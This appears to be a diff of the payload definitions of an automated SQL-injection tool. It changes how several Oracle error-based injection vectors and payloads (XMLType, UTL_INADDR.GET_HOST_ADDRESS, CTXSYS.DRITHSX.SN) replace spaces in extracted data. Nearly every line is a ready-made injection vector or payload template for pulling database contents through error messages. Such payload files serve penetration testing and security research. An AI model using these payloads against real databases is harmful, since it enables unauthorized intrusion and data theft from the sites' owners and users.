@@ -761,9 +761,9 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -780,9 +780,9 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -800,9 +800,9 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -897,9 +897,9 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
-            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -916,9 +916,9 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -936,9 +936,9 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1040,9 +1040,9 @@ Formats:
         <risk>0</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
-            <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1139,9 +1139,9 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
-            <payload>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
